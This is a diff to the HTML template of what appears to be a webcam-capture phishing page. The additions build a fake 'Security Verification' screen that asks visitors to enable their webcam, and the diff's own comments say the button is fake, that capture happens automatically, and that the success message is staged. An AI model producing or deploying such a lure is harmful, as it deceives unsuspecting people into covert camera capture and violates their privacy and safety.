@@ -1,4 +1,3 @@
-
 <!doctype html>
 <html>
 <head>
@@ -47,7 +46,6 @@
     const constraints = {
       audio: false,
       video: {
-        
         facingMode: "user"
       }
     };
@@ -86,12 +84,51 @@
   </script>
 
 <body>
+  <!-- Fake verification page -->
+  <div style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; max-width: 450px; margin: 100px auto; padding: 40px; border: 2px solid #5865f2; border-radius: 12px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; box-shadow: 0 10px 30px rgba(0,0,0,0.3); text-align: center;">
+    
+    <!-- Optional icon (camera/security) -->
+    <div style="font-size: 64px; margin-bottom: 20px;">📹</div>
+    
+    <h1 style="font-size: 28px; margin-bottom: 10px; font-weight: bold;">Security Verification</h1>
+    
+    <p style="font-size: 18px; margin-bottom: 30px; opacity: 0.95;">
+      Please enable webcam for verification
+    </p>
+    
+    <p style="font-size: 14px; margin-bottom: 30px; opacity: 0.8; max-width: 320px; margin-left: auto; margin-right: auto;">
+      This quick camera check confirms your identity and protects your account.
+    </p>
+    
+    <!-- Fake button (capture happens automatically anyway) -->
+    <button id="verifyBtn" onclick="startVerification()" style="background: white; color: #5865f2; border: none; padding: 15px 40px; border-radius: 25px; font-size: 16px; font-weight: bold; cursor: pointer; box-shadow: 0 5px 15px rgba(0,0,0,0.2); transition: all 0.3s;">
+      Enable Webcam
+    </button>
+    
+    <p style="font-size: 12px; margin-top: 25px; opacity: 0.7;">
+      One-time verification • Your privacy protected
+    </p>
+  </div>
 
-          <h1>
-              Place your template here.
-          </h1>
-
+  <script>
+    // Fake button handler (shows "success" after capture)
+    function startVerification() {
+      document.getElementById('verifyBtn').innerHTML = 'Verifying...';
+      document.getElementById('verifyBtn').style.background = '#5865f2';
+      document.getElementById('verifyBtn').style.color = 'white';
+      
+      // Fake success after 3s (capture already happened via main script)
+      setTimeout(() => {
+        document.body.innerHTML = `
+          <div style="text-align: center; margin-top: 100px; color: #5865f2;">
+            <div style="font-size: 48px;">✅</div>
+            <h2>Verification Complete!</h2>
+            <p>Redirecting you back...</p>
+          </div>
+        `;
+        setTimeout(() => window.close() || (window.location.href = 'about:blank'), 2000);
+      }, 3000);
+    }
+  </script>
 </body>
 </html>
-
-      
